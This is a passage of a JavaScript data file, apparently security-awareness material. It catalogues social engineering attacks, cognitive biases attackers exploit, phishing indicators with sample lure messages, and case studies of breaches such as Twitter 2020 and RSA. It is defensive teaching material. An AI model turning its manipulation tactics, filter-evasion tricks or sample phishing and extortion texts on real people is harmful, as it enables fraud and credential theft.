      "Never pay upfront fees for employment opportunities",
      "Be cautious about providing sensitive personal information before verified hiring",
      "Verify recruiter identities through official company channels",
      "Be suspicious of positions that require no interview or have minimal requirements"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "10-25%"
  },
  {
    name: "Callback Phishing (TOAD)",
    category: "Voice/Digital",
    description: "Callback phishing, also known as Telephone-Oriented Attack Delivery (TOAD), combines email and voice-based social engineering into a multi-channel attack. The victim first receives a legitimate-looking email, typically an invoice, subscription confirmation, or security alert, that contains no malicious links or attachments but includes a phone number to call for assistance. When the victim calls the number, they reach the attacker's call center where operators guide them through actions that compromise their computer, such as visiting a malicious website, downloading remote access tools, or disabling security software. This technique is highly effective because the initial email passes email security filters since it contains no malicious content, and the victim initiates the phone call themselves, increasing their trust in the interaction.",
    realWorldExamples: [
      "The BazarCall campaign sent emails confirming expensive subscriptions to services like a medical supplies company, prompting recipients to call to cancel. Call center operators then guided victims to a website that downloaded BazarLoader malware.",
      "Attackers sent fake PayPal invoices for high-value purchases ($500+) with a customer service number. When victims called to dispute the charge, operators guided them to install AnyDesk for remote assistance, then used access to steal banking credentials.",
      "The Luna Moth / Silent Ransom group sent subscription renewal emails for amounts between $200-$500, directing victims to call centers where operators installed Zoho Assist for remote access, then exfiltrated data for extortion."
    ],
    indicators: [
      "Emails for purchases or subscriptions you did not make, with a phone number to call",
      "Invoices or receipts with no clickable links, only phone numbers",
      "Caller urgency to install remote access software during the support call",
      "Operators who insist on guiding you through steps rather than handling it remotely",
      "Subscription amounts chosen to be concerning but not extreme"
    ],
    countermeasures: [
      "Verify charges directly through official company websites or apps, not numbers in emails",
      "Never install remote access software at the direction of someone you called from an email",
      "Check credit card and bank statements directly rather than relying on email notifications",
      "Report suspicious emails to the impersonated company through verified channels",
      "Deploy email security solutions that can detect callback phishing patterns"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "15-30%"
  }
];

const SE_PSYCHOLOGY = [
  {
    name: "Reciprocity",
    description: "The principle of reciprocity describes the human tendency to want to return favors, gifts, or concessions. When someone does something for us, we feel a strong psychological obligation to reciprocate, even if the original favor was unsolicited or of significantly less value than what is requested in return.",
    howExploited: "Attackers offer small favors, free gifts, or helpful information to targets before making their actual request. The target feels psychologically indebted and is more likely to comply with the subsequent request, even if it involves sharing sensitive information or granting access they normally would not.",
    defense: "Recognize when unsolicited favors are being used to create obligation. Evaluate requests based on their own merit rather than on feelings of indebtedness. Establish organizational policies that prohibit employees from accepting gifts or favors from unverified sources."
  },
  {
    name: "Commitment and Consistency",
    description: "Once people commit to a position, decision, or course of action, they feel compelled to behave consistently with that commitment. This drive for internal consistency is so powerful that people will often follow through even when the original reasons for the commitment are no longer valid or when doing so is against their interests.",
    howExploited: "Attackers start with small, reasonable requests that the target readily agrees to, then gradually escalate to larger, more sensitive requests. Because the target has already committed to being helpful, they continue to comply to remain consistent with their established behavior pattern. This is known as the foot-in-the-door technique.",
    defense: "Be aware of gradual escalation in requests and evaluate each request independently. Do not feel bound by previous small commitments when larger requests follow. Establish clear boundaries for what information and access can be provided, regardless of prior interactions."
  },
  {
    name: "Social Proof",
    description: "People look to the behavior of others to determine correct behavior, especially in situations of uncertainty. When we see others performing an action, we tend to assume that action is appropriate and correct. This effect is amplified when the observed others are similar to us or when we are in unfamiliar situations.",
    howExploited: "Attackers claim that other employees, departments, or organizations have already complied with similar requests, making the target feel that compliance is normal and expected. They may fabricate testimonials, reference other victims by name, or create fake social media engagement to establish legitimacy.",
    defense: "Verify claims about others' behavior independently rather than taking them at face value. Establish and communicate clear organizational policies so employees have a reference point beyond peer behavior. Question whether cited precedents are relevant and verified."
  },
  {
    name: "Authority",
    description: "People have a deeply ingrained tendency to obey authority figures, even when such obedience conflicts with personal judgment or ethics. This deference extends beyond legitimate authority to include the mere symbols and trappings of authority, such as titles, uniforms, and confident demeanor.",
    howExploited: "Attackers impersonate authority figures such as executives, IT administrators, law enforcement officers, or regulators. They use authoritative language, reference organizational hierarchy, and exploit employees' reluctance to question or challenge those perceived as superior in rank or expertise.",
    defense: "Verify the identity and authority of anyone making unusual requests, regardless of their claimed position. Establish verification procedures that apply equally to all requestors, including senior leadership. Create a culture where questioning authority on security matters is encouraged."
  },
  {
    name: "Liking",
    description: "People are more easily persuaded by individuals they like. Factors that increase liking include physical attractiveness, similarity to the target, compliments, familiarity, and association with positive things. We are significantly more likely to comply with requests from people we feel a personal connection with.",
    howExploited: "Attackers build rapport with targets through flattery, finding common interests, mirroring communication styles, and establishing personal connections before making their requests. They may research targets' social media to identify shared hobbies, alma maters, or mutual acquaintances to quickly establish a sense of familiarity and trust.",
    defense: "Separate personal feelings about a requestor from evaluation of the request itself. Be cautious when someone rapidly establishes a personal connection, especially in professional contexts. Evaluate whether requests would be appropriate regardless of who is making them."
  },
  {
    name: "Scarcity",
    description: "People assign greater value to opportunities and resources that are scarce or diminishing in availability. The fear of missing out creates urgency that can override careful decision-making. Scarcity also increases the perceived desirability of whatever is being offered.",
    howExploited: "Attackers create artificial time pressure and deadlines to prevent targets from thinking critically or verifying requests. They claim that offers are limited-time, that accounts will be locked imminently, or that opportunities will disappear if not acted upon immediately. This manufactured urgency short-circuits normal verification processes.",
    defense: "Treat extreme urgency as a red flag rather than a reason to rush. Establish policies that allow for verification even under time pressure. Recognize that legitimate organizations rarely require instant action without any opportunity for verification."
  },
  {
    name: "Anchoring Bias",
    description: "Anchoring bias is the cognitive tendency to rely heavily on the first piece of information encountered when making decisions. The initial information serves as a reference point or anchor, and subsequent judgments are made by adjusting from that anchor, often insufficiently.",
    howExploited: "Attackers present an extreme initial claim or request to set an anchor, then follow with a more moderate request that seems reasonable by comparison. For example, a scammer might initially claim thousands of dollars are at risk, making a request for hundreds in verification fees seem minor. The anchor distorts the target's perception of what is reasonable.",
    defense: "Evaluate each piece of information independently rather than relative to an initial anchor point. Seek additional reference points and external data before making decisions. Be especially cautious when initial claims seem extreme and subsequent requests appear moderate by comparison."
  },
  {
    name: "Bandwagon Effect",
    description: "The bandwagon effect is the tendency for people to adopt certain behaviors, styles, or beliefs simply because others are doing so. The probability of individual adoption increases with the proportion of others who have already adopted the behavior. This is closely related to social proof but specifically emphasizes the snowball effect of adoption.",
    howExploited: "Attackers claim widespread adoption of their requests to make non-compliance seem abnormal. They may state that 'everyone in the department has already provided this information' or that 'all other clients have upgraded to this new system.' Creating a sense that resistance is futile or abnormal pressures targets into compliance.",
    defense: "Verify claims of widespread adoption through independent channels. Recognize that popularity does not equal legitimacy. Make security decisions based on policy and procedure rather than claimed behavior of peers."
  },
  {
    name: "Confirmation Bias",
    description: "Confirmation bias is the tendency to search for, interpret, favor, and recall information that confirms pre-existing beliefs while giving disproportionately less attention to information that contradicts them. People actively seek out information that validates their existing views and dismiss or rationalize conflicting evidence.",
    howExploited: "Attackers research a target's existing beliefs, concerns, or expectations and craft messages that align with them. If a target is worried about a particular security threat, the attacker may send a phishing email about exactly that threat. The target's pre-existing concern makes them more likely to believe the email is legitimate and act on it without sufficient verification.",
    defense: "Actively seek disconfirming evidence when evaluating unusual requests or alerts. Follow established verification procedures regardless of how plausible a message appears. Implement devil's advocate practices in security response protocols."
  },
  {
    name: "Dunning-Kruger Effect",
    description: "The Dunning-Kruger effect describes a cognitive bias where people with limited knowledge or competence in a domain greatly overestimate their own ability in that domain. Conversely, those with genuine expertise tend to underestimate their competence. This creates a dangerous confidence gap in security contexts.",
    howExploited: "Attackers target individuals who overestimate their ability to detect scams or social engineering attempts. These overconfident individuals may bypass security procedures they consider unnecessary, ignore warnings, or engage with suspicious communications believing they can outsmart the attacker. Their false confidence becomes the vulnerability.",
    defense: "Foster a security culture that acknowledges everyone is potentially vulnerable to social engineering. Implement mandatory security procedures that cannot be bypassed regardless of self-assessed expertise. Use realistic phishing simulations to provide calibrating feedback on actual detection abilities."
  },
  {
    name: "Framing Effect",
    description: "The framing effect demonstrates that people react differently to the same information depending on how it is presented. Choices framed as avoiding losses tend to produce different decisions than the same choices framed as achieving gains, even when the outcomes are objectively identical.",
    howExploited: "Attackers frame their requests in terms of loss prevention rather than gains. Instead of asking a target to do something for a benefit, they warn of dire consequences if the target does not comply -- account suspension, data loss, legal action, or missed deadlines. Loss-framed messages create anxiety that impairs rational decision-making.",
    defense: "Reframe urgent loss-based messages in neutral terms before responding. Ask what would happen if you took time to verify the request through proper channels. Recognize that legitimate organizations provide time and options rather than presenting a single urgent action to avoid catastrophe."
  },
  {
    name: "Halo Effect",
    description: "The halo effect is a cognitive bias where a positive impression in one area influences perception in other unrelated areas. If someone is perceived positively on one trait, such as attractiveness, confidence, or technical competence, observers tend to rate them positively on other traits as well, including trustworthiness and honesty.",
    howExploited: "Attackers present themselves as polished, professional, and competent to create a positive first impression that carries over into trust. A well-dressed individual with a confident demeanor who uses appropriate technical jargon will be more readily trusted with sensitive information or access, regardless of whether their identity has been verified.",
    defense: "Separate assessments of personal qualities from security decisions. A pleasant, professional demeanor does not verify identity or authorize access. Apply verification procedures consistently regardless of how trustworthy someone appears."
  },
  {
    name: "Loss Aversion",
    description: "Loss aversion describes the psychological principle that the pain of losing something is roughly twice as powerful as the pleasure of gaining something of equivalent value. People are strongly motivated to avoid losses, even when the expected value of a gamble is positive. This asymmetry profoundly affects decision-making under uncertainty.",
    howExploited: "Attackers emphasize potential losses to motivate immediate action. Messages warning that an account will be permanently deleted, that data will be lost, or that a fine will be imposed create powerful motivation to comply with the attacker's instructions. The fear of loss overrides the caution that would normally prevent compliance with suspicious requests.",
    defense: "Recognize loss-based urgency as a potential manipulation tactic. Verify the claimed threat through independent channels before taking action. Understand that legitimate organizations typically provide multiple notifications and grace periods before irreversible actions."
  },
  {
    name: "Mere Exposure Effect",
    description: "The mere exposure effect is the tendency for people to develop a preference for things simply because they are familiar with them. Repeated exposure to a stimulus increases liking and trust, even when the person is not consciously aware of the prior exposures. This applies to people, brands, logos, and communication patterns.",
    howExploited: "Attackers create familiarity before launching their main attack by sending benign communications, engaging on social media, or establishing a presence in the target's professional circles. By the time the actual social engineering attempt occurs, the target already feels familiar with the attacker and is more likely to trust them.",
    defense: "Do not conflate familiarity with verification. Apply the same security procedures to familiar contacts as to unknown ones when they make unusual requests. Be aware that familiarity can be deliberately manufactured through repeated low-stakes interactions."
  },
  {
    name: "Negativity Bias",
    description: "Negativity bias is the tendency for negative events, information, and emotions to have a greater impact on psychological states and decision-making than positive ones. People give more weight to negative experiences, threats, and losses than to equivalent positive experiences, opportunities, and gains.",
    howExploited: "Attackers leverage negativity bias by leading with alarming or threatening information. A phishing email reporting a security breach, unauthorized transaction, or account compromise triggers an immediate emotional response that can override rational analysis. The negative framing ensures the message receives attention and prompts urgent action.",
    defense: "Pause before responding to alarming communications. Verify negative claims through official channels before taking action. Implement a mandatory cooling-off period for responses to threatening messages. Recognize that legitimate security alerts rarely require immediate unsupervised action."
  },
  {
    name: "Optimism Bias",
    description: "Optimism bias is the belief that one is less likely than others to experience negative events. People consistently underestimate their personal risk while accurately or overestimating the risk to others. This bias leads individuals to believe they are unlikely to fall victim to scams, cyberattacks, or social engineering.",
    howExploited: "Attackers benefit from targets' belief that 'it will not happen to me.' Employees who believe they are too smart or too careful to be targeted may take fewer precautions, skip security training, ignore warnings, or bypass security protocols they consider unnecessary. Their optimism about their own invulnerability becomes the vector for compromise.",
    defense: "Use statistics and real case studies to demonstrate that anyone can be victimized. Implement mandatory security controls that do not rely on individual risk assessment. Conduct regular realistic simulations to challenge overconfident assumptions about personal invulnerability."
  },
  {
    name: "Peak-End Rule",
    description: "The peak-end rule describes how people judge experiences primarily based on two moments: the most intense point (the peak) and the final moment (the end). The overall average or duration of the experience has relatively little impact on the remembered assessment compared to these two critical moments.",
    howExploited: "Attackers design interactions to end on a positive note, ensuring the target remembers the experience favorably and is open to future contact. Even if the interaction involved sharing sensitive information, a positive ending creates a favorable memory that reduces the likelihood of the target later questioning whether the interaction was legitimate.",
    defense: "Evaluate security interactions based on their content and compliance with procedures, not on how they felt at the time. Implement post-interaction review processes that analyze what information was shared regardless of the subjective experience. Log all interactions involving sensitive data requests for later audit."
  },
  {
    name: "Reactance",
    description: "Psychological reactance occurs when people feel their freedom of choice is being restricted or threatened, causing them to desire the restricted option even more strongly. Being told they cannot or should not do something can paradoxically increase their desire to do it.",
    howExploited: "Some advanced social engineers use reverse psychology, telling targets NOT to do something or implying that certain information is forbidden or restricted. This can trigger reactance, making the target more eager to access the information, click the link, or share the details specifically because they were told not to. The perceived restriction increases the target's motivation to engage.",
    defense: "Be aware that feeling a strong urge to do something specifically because it was restricted may indicate manipulation. Follow security policies based on rational assessment rather than emotional reactions to perceived restrictions. Discuss reactance in security awareness training so employees can recognize when it is being triggered."
  },
  {
    name: "Status Quo Bias",
    description: "Status quo bias is the preference for the current state of affairs, where any change from the baseline is perceived as a loss. People tend to resist changes to established routines, defaults, and configurations, even when change would be objectively beneficial. This manifests as inertia in decision-making.",
    howExploited: "Attackers exploit status quo bias by disguising malicious actions as maintenance of the current state. Messages framed as 'verify your current password to prevent account changes' or 'confirm your details to keep your account active' present compliance as maintaining the status quo rather than taking a new action, making the request feel safer and more natural.",
    defense: "Recognize that requests framed as maintaining the status quo may actually be requesting new, risky actions. Evaluate all requests by their actual content rather than their framing. Understand that legitimate services rarely require active confirmation to maintain existing access."
  },
  {
    name: "Sunk Cost Fallacy",
    description: "The sunk cost fallacy is the tendency to continue investing in something because of previously invested resources (time, money, effort), even when continued investment is not justified by the expected future returns. People feel that abandoning an endeavor would waste what has already been invested.",
    howExploited: "Attackers engage targets in extended interactions, getting them to invest time and effort before making the critical request. After a target has spent significant time on a phone call, completed several steps in a process, or provided some information, they are reluctant to abort the interaction because it would mean their prior investment was wasted. Romance scams are a prime example, where months of emotional investment make victims continue sending money.",
    defense: "Evaluate each new request independently of prior investment in the interaction. Recognize that cutting losses is rational even when it feels like wasting prior effort. Implement time limits and checkpoint reviews for extended interactions involving sensitive information or access."
  }
];

const PHISHING_INDICATORS = [
  {
    indicator: "Sender Address Mismatch",
    description: "The display name shows a legitimate organization, but the actual email address uses a different, unrelated, or suspicious domain.",
    example: "Display name shows 'Bank of America Security' but the sender address is security-alert@b0famerica-verify.com",
    severity: "high"
  },
  {
    indicator: "Typosquatting Domain",
    description: "The sender or linked domain uses a slight misspelling or character substitution of a legitimate domain name.",
    example: "Email from support@mircosoft.com or links to www.arnazon.com instead of the legitimate domains",
    severity: "high"
  },
  {
    indicator: "Urgency Language",
    description: "The message creates artificial time pressure through threats of account suspension, data loss, or legal action if immediate action is not taken.",
    example: "'Your account will be permanently deleted within 24 hours unless you verify your identity immediately by clicking the link below.'",
    severity: "medium"
  },
  {
    indicator: "Generic Greeting",
    description: "The email uses a non-personalized salutation instead of the recipient's actual name, suggesting a mass-sent message.",
    example: "'Dear Valued Customer' or 'Dear Account Holder' instead of addressing the recipient by their actual name",
    severity: "low"
  },
  {
    indicator: "Grammar and Spelling Errors",
    description: "The message contains grammatical mistakes, awkward phrasing, or misspellings that would not be present in official communications from a professional organization.",
    example: "'We have detected unusuall activity on you're acount. Please login to verify you informations immediately.'",
    severity: "medium"
  },
  {
    indicator: "Suspicious Link URL",
    description: "Hyperlinks in the email point to URLs that do not match the claimed organization or use suspicious subdomains and paths.",
    example: "A link displayed as 'https://www.paypal.com/verify' actually points to 'https://paypal.security-verify.malicious-site.com/login'",
    severity: "critical"
  },
  {
    indicator: "URL Shortener",
    description: "The email uses shortened URLs that obscure the actual destination, preventing the recipient from evaluating the link before clicking.",
    example: "'Click here to verify your account: https://bit.ly/3xK9mQ2' instead of a direct link to the legitimate service domain",
    severity: "medium"
  },
  {
    indicator: "Dangerous Attachment Type",
    description: "The email includes attachments with executable or macro-enabled file types that can run malicious code when opened.",
    example: "An attachment named 'Invoice_Q4_2024.xlsm' (macro-enabled Excel) or 'Shipping_Label.exe' disguised with a document icon",
    severity: "critical"
  },
  {
    indicator: "Spoofed Logo Quality",
    description: "Company logos in the email are low resolution, incorrectly colored, outdated, or slightly different from the authentic versions.",
    example: "A PayPal phishing email uses an older version of the PayPal logo with incorrect blue coloring and pixelated edges",
    severity: "low"
  },
  {
    indicator: "Missing Digital Signature",
    description: "The email lacks a valid cryptographic signature (S/MIME or PGP) from the claimed sender, which legitimate organizations often use for official communications.",
    example: "An email claiming to be from your bank lacks the S/MIME signature that their genuine automated messages always carry",
    severity: "low"
  },
  {
    indicator: "Reply-To Mismatch",
    description: "The Reply-To address differs from the From address, indicating that responses will be directed to a different, potentially malicious, destination.",
    example: "From address shows hr@company.com but Reply-To is set to hr-department@gmail.com",
    severity: "high"
  },
  {
    indicator: "Too-Good-To-Be-True Offer",
    description: "The email promises unrealistic rewards, prizes, or benefits that are designed to override the recipient's critical thinking with excitement or greed.",
    example: "'Congratulations! You have been selected to receive a $10,000 Amazon gift card. Claim your reward within 48 hours.'",
    severity: "medium"
  },
  {
    indicator: "Credential Request",
    description: "The email directly requests login credentials, passwords, PINs, or security question answers, which legitimate organizations never do via email.",
    example: "'To restore access to your account, please reply with your current username, password, and the answer to your security question.'",
    severity: "critical"
  },
  {
    indicator: "Unusual Sending Time",
    description: "The email was sent at an unusual time for the supposed sender's timezone or business hours, suggesting automated or overseas origin.",
    example: "An email from your US-based HR department was sent at 3:47 AM Eastern time on a Sunday",
    severity: "low"
  },
  {
    indicator: "Embedded Form",
    description: "The email contains an HTML form embedded directly within the message body, requesting information to be submitted without navigating to a verified website.",
    example: "An email includes text fields for username and password directly in the message body with a 'Submit' button that posts data to an external server",
    severity: "critical"
  },
  {
    indicator: "Data URI Link",
    description: "The email contains links using the data: URI scheme, which can encode and execute malicious content directly in the browser without connecting to an external server.",
    example: "A link that appears to be a login page but uses 'data:text/html;base64,...' encoding to render a phishing form locally in the browser",
    severity: "critical"
  },
  {
    indicator: "Homograph Attack (IDN)",
    description: "The domain name uses internationalized characters that visually resemble ASCII characters, making a fraudulent domain appear identical to a legitimate one.",
    example: "A URL using Cyrillic 'a' (U+0430) instead of Latin 'a' in 'apple.com' so the domain appears identical but resolves to a different server",
    severity: "critical"
  },
  {
    indicator: "Display Name Spoofing",
    description: "The email display name is set to match a known contact or organization, while the actual email address belongs to the attacker.",
    example: "Display name 'John Smith - IT Director' with the actual address being john.smith8847@protonmail.com instead of jsmith@company.com",
    severity: "high"
  },
  {
    indicator: "Envelope Sender Mismatch",
    description: "The SMTP envelope sender (Return-Path) differs from the From header displayed to the recipient, indicating possible spoofing.",
    example: "The visible From header shows ceo@company.com but the Return-Path in email headers reveals bounce-3847@attacker-domain.net",
    severity: "high"
  },
  {
    indicator: "Missing SPF/DKIM/DMARC",
    description: "The email fails or lacks SPF, DKIM, and DMARC authentication checks, indicating that it may not have been sent from the domain's authorized mail servers.",
    example: "Email headers show 'spf=fail', 'dkim=none', and 'dmarc=fail' for a message claiming to be from a major financial institution",
    severity: "high"
  },
  {
    indicator: "Threatening Language",
    description: "The email uses threats of negative consequences such as legal action, arrest, fines, or account termination to create fear and urgency.",
    example: "'Failure to respond within 24 hours will result in your account being referred to our legal department for collections and a report filed with credit bureaus.'",
    severity: "medium"
  },
  {
    indicator: "Fake Unsubscribe Link",
    description: "The email includes an unsubscribe link that actually leads to a phishing page, malware download, or simply confirms the email address is active.",
    example: "Clicking 'Unsubscribe from future emails' redirects to a page requesting email and password to 'confirm unsubscription preferences'",
    severity: "medium"
  },
  {
    indicator: "QR Code in Email",
    description: "The email contains a QR code instead of clickable links, which bypasses URL-scanning email security tools and prevents preview of the destination.",
    example: "An email claiming to be from IT security asks employees to scan a QR code to 'update their MFA settings' which leads to a credential harvesting page",
    severity: "high"
  },
  {
    indicator: "Cryptocurrency Payment Request",
    description: "The email requests payment in cryptocurrency, which is untraceable and non-reversible, a strong indicator of fraudulent or extortion activity.",
    example: "'Send 0.5 BTC to wallet address bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh within 48 hours or your data will be published.'",
    severity: "critical"
  },
  {
    indicator: "Unusual File Extension",
    description: "Attachments use uncommon or double file extensions designed to disguise executable files as benign document types.",
    example: "An attachment named 'Report.pdf.scr' or 'Invoice.doc.js' uses double extensions to hide the true file type behind an innocent-looking first extension",
    severity: "critical"
  },
  {
    indicator: "Password-Protected Attachment",
    description: "The email includes a password-protected archive with the password provided in the email body, a technique used to bypass automated malware scanning.",
    example: "'Please find the attached confidential document. Password: Invoice2024. Open the ZIP file and review the enclosed PDF.' The ZIP contains malware that scanners cannot inspect due to encryption.",
    severity: "high"
  },
  {
    indicator: "Brand Impersonation",
    description: "The email closely mimics the visual design, templates, and branding of a well-known company but with subtle inconsistencies in layout, fonts, or color schemes.",
    example: "An email mimicking Netflix uses the correct red color scheme and layout but the footer links point to non-Netflix domains and the copyright year is outdated",
    severity: "medium"
  },
  {
    indicator: "Callback Phishing Number",
    description: "The email contains no malicious links or attachments but provides a phone number to call, where operators conduct the social engineering attack verbally.",
    example: "'Your subscription of $499.99 has been renewed. If you did not authorize this charge, call 1-888-555-0147 within 24 hours to cancel and receive a full refund.'",
    severity: "medium"
  },
  {
    indicator: "HTML Smuggling",
    description: "The email contains HTML content that uses JavaScript to dynamically assemble and download a malicious file when the email is opened or a link is clicked.",
    example: "An email with an HTML attachment that, when opened in a browser, uses JavaScript Blob objects to assemble and automatically download a malicious ISO file to the user's downloads folder",
    severity: "critical"
  },
  {
    indicator: "Zero-Point Font Text",
    description: "The email contains hidden text rendered in zero-point font size, invisible to the reader but designed to confuse email security natural language processing and keyword detection.",
    example: "Visible text reads 'Your account is suspended' but hidden zero-point text between words inserts benign terms like 'safe transaction confirmed' to bypass security filters",
    severity: "high"
  },
  {
    indicator: "Mismatched Salutation and Signature",
    description: "The email greeting and closing signature reference different individuals or departments, suggesting the message was hastily assembled from templates.",
    example: "The email opens with 'Dear Customer of First National Bank' but the signature block reads 'Chase Bank Fraud Department'",
    severity: "medium"
  },
  {
    indicator: "Suspicious Calendar Invite",
    description: "An unsolicited calendar invitation contains phishing links in the event description or location fields, exploiting automatic calendar integration in email clients.",
    example: "A calendar invite for 'Mandatory Security Training' with a location field containing a URL that leads to a credential harvesting page disguised as the corporate LMS",
    severity: "medium"
  }
];

const FAMOUS_SE_ATTACKS = [
  {
    name: "Kevin Mitnick's Phone Company Exploits",
    year: "1990s",
    attacker: "Kevin Mitnick",
    target: "Pacific Bell, Nokia, Motorola, Sun Microsystems",
    technique: "Pretexting, Impersonation, Social Engineering over Phone",
    description: "Kevin Mitnick, arguably the most famous social engineer in history, conducted a series of intrusions throughout the late 1980s and 1990s that relied heavily on social engineering rather than purely technical exploitation. Mitnick would call phone company employees, impersonate fellow technicians or managers, and manipulate them into providing access codes, dial-up numbers, and system configurations. He used these techniques to access corporate networks at Nokia, Motorola, Sun Microsystems, and numerous telecom providers. His methods demonstrated that the human element was often the weakest link in security, as he could bypass sophisticated technical controls simply by convincing the right person to help him. His five-year pursuit by the FBI and subsequent arrest in 1995 brought global attention to social engineering as a security threat.",
    impact: "Unauthorized access to proprietary source code and internal systems at multiple Fortune 500 companies. Estimated damages in the hundreds of millions of dollars, though the exact figure was disputed. His case led to fundamental changes in how organizations approach human-factor security.",
    lessonsLearned: [
      "Technical security controls are ineffective if employees can be manipulated into bypassing them",
      "Help desk and support staff are primary targets and require specialized security training",
      "Identity verification procedures must be rigorous and consistently enforced",
      "Social engineering attacks can be sustained over long periods, building trust incrementally"
    ]
  },
  {
    name: "Twitter Bitcoin Scam (2020)",
    year: 2020,
    attacker: "Graham Ivan Clark, Mason Sheppard, Nima Fazeli",
    target: "Twitter, Inc.",
    technique: "Phone-based Social Engineering (Vishing), Credential Theft",
    description: "In July 2020, a 17-year-old from Florida and his associates compromised Twitter's internal systems by conducting phone-based social engineering attacks against Twitter employees. The attackers called Twitter staff, posing as colleagues from the IT department, and directed them to a phishing site that mimicked Twitter's internal VPN portal. After obtaining employee credentials and bypassing two-factor authentication, the attackers gained access to Twitter's internal admin tools. They then took over 130 high-profile accounts including those of Barack Obama, Joe Biden, Elon Musk, Bill Gates, Apple, and Uber. The compromised accounts posted messages promoting a Bitcoin scam that collected over $120,000 in cryptocurrency within hours. The attack exposed critical weaknesses in Twitter's internal security controls and insider access management.",
    impact: "130 high-profile Twitter accounts compromised. Over $120,000 in Bitcoin stolen. Twitter's stock price dropped. Massive reputational damage and loss of public trust. Congressional inquiries into social media platform security. The lead attacker was sentenced to three years in prison.",
    lessonsLearned: [
      "Internal tools should have granular access controls and audit logging",
      "Employee training must specifically address phone-based social engineering attacks",
      "Multi-factor authentication should use hardware tokens rather than SMS or app-based codes that can be phished",
      "Young and relatively unsophisticated attackers can compromise major platforms through social engineering alone",
      "Insider access to admin tools represents a catastrophic risk if not properly controlled"
    ]
  },
  {
    name: "RSA SecurID Breach",
    year: 2011,
    attacker: "APT group (attributed to Chinese state actors)",
    target: "RSA Security (division of EMC)",
    technique: "Spear Phishing with Malicious Excel Attachment",
    description: "In March 2011, RSA Security, the company that produced the widely used SecurID two-factor authentication tokens, was compromised through a targeted spear phishing attack. Attackers sent emails to small groups of RSA employees with the subject line '2011 Recruitment Plan' and an attached Excel spreadsheet named 'plan.xls.' The spreadsheet contained a zero-day exploit for Adobe Flash (CVE-2011-0609) embedded in the file. When opened, the exploit installed a variant of the Poison Ivy remote access trojan on the victim's workstation. The attackers then moved laterally through RSA's network and extracted data related to SecurID token seed values. This breach had cascading effects, as the stolen seed values potentially compromised the security of every organization using RSA SecurID tokens, including major defense contractors, government agencies, and financial institutions.",
    impact: "Estimated $66 million in direct costs to RSA for remediation, including replacing millions of SecurID tokens. Downstream impacts on defense contractors including Lockheed Martin, which reported attempted intrusions using compromised SecurID data. Fundamental loss of trust in what was considered the gold standard of two-factor authentication.",
    lessonsLearned: [
      "Even security companies are vulnerable to social engineering attacks",
      "A single successful spear phishing email can compromise an entire organization",
      "Zero-day exploits combined with social engineering create an extremely potent attack vector",
      "Supply chain security extends to authentication and security product vendors",
      "Organizations must have detection capabilities for lateral movement, not just perimeter defenses"
    ]
  },
  {
    name: "Target Data Breach",
    year: 2013,
    attacker: "Eastern European cybercrime group",
    target: "Target Corporation",
    technique: "Third-Party Vendor Compromise via Spear Phishing",
    description: "The 2013 Target breach, one of the largest retail data breaches in history, began with a spear phishing attack against Fazio Mechanical Services, a small HVAC contractor that had network access to Target's systems for billing and project management purposes. Attackers sent phishing emails to Fazio employees, successfully installing the Citadel banking trojan on their systems. Using credentials stolen from Fazio's compromised network, the attackers accessed Target's vendor portal and then moved laterally to Target's point-of-sale systems. They deployed memory-scraping malware (a variant of BlackPOS) across Target's POS terminals that captured credit and debit card data as it was processed. The breach went undetected for weeks despite FireEye security alerts being triggered, which Target's security team failed to act upon.",
    impact: "40 million credit and debit card numbers stolen. Personal information of 70 million customers exposed. Target spent over $200 million on breach-related costs. CEO Gregg Steinhafel and CIO Beth Jacob resigned. Target's stock price dropped significantly and holiday sales declined by 46% year-over-year.",
    lessonsLearned: [
      "Third-party vendor access represents a critical attack surface that must be managed",
      "Network segmentation between vendor access and critical systems is essential",
      "Security alerts must be investigated promptly -- detection tools are useless if alerts are ignored",
      "Small vendors with access to large corporate networks need security requirements and auditing",
      "The initial compromise vector can be simple even when the ultimate target is highly defended"
    ]
  },
  {
    name: "Sony Pictures Hack",
    year: 2014,
    attacker: "Guardians of Peace (attributed to North Korea / Lazarus Group)",
    target: "Sony Pictures Entertainment",
    technique: "Spear Phishing, Credential Harvesting",
    description: "In November 2014, Sony Pictures Entertainment suffered a devastating cyberattack that began with spear phishing emails sent to Sony employees. The attackers, operating under the name 'Guardians of Peace' and later attributed to North Korea's Lazarus Group, sent emails impersonating Apple ID verification requests that directed employees to a credential harvesting site. The phishing campaign also included LinkedIn messages from fake recruiters. Once inside the network, the attackers spent months conducting reconnaissance, escalating privileges, and exfiltrating massive amounts of data before deploying destructive wiper malware that rendered thousands of workstations inoperable. The attackers leaked unreleased films, executive emails containing embarrassing and damaging content, employee personal data including Social Security numbers and salary information, and internal business plans.",
    impact: "Over 100 terabytes of data stolen and leaked. Five unreleased films published online. Sensitive personal data of 47,000 employees and contractors exposed. Estimated damages of $100 million or more. CEO Amy Pascal stepped down. The attack was significant enough to prompt a direct response from the US President and sanctions against North Korea.",
    lessonsLearned: [
      "Nation-state actors use social engineering as the initial attack vector even in geopolitically motivated operations",
      "Dwell time between initial compromise and destructive action can be months, requiring continuous monitoring",
      "Email security awareness must cover phishing beyond just corporate email, including personal accounts and social media",
      "Data classification and encryption are critical to limit the impact of a breach",
      "Incident response plans must account for destructive attacks that can render systems completely inoperable"
    ]
  },
  {
    name: "Ubiquiti Networks BEC Attack",
    year: 2015,
    attacker: "Unknown cybercriminal group",
    target: "Ubiquiti Networks",
    technique: "Business Email Compromise, CEO Fraud",
    description: "In 2015, networking equipment manufacturer Ubiquiti Networks lost $46.7 million to a business email compromise attack targeting the company's finance department. Attackers impersonated executives and used fraudulent requests to trick finance personnel into initiating wire transfers to overseas accounts controlled by the attackers. The emails appeared to come from senior company executives and referenced real business contexts to appear legitimate. The transfers were directed to accounts in multiple countries, complicating recovery efforts. Ubiquiti was able to recover approximately $15 million through legal proceedings and cooperation with law enforcement, but the majority of the funds were lost. The attack demonstrated that even technology companies with sophisticated employees were vulnerable to well-crafted BEC attacks.",
    impact: "$46.7 million lost in fraudulent wire transfers, with only approximately $15 million recovered. Stock price declined sharply following disclosure. The incident highlighted that BEC attacks could target technology companies, not just non-technical organizations. It became a prominent case study in the FBI's warnings about BEC fraud.",
    lessonsLearned: [
      "Wire transfer procedures must require multi-person authorization and out-of-band verification",
      "Technology companies are not immune to low-tech social engineering attacks",
      "Finance department employees need specialized training on BEC and CEO fraud tactics",
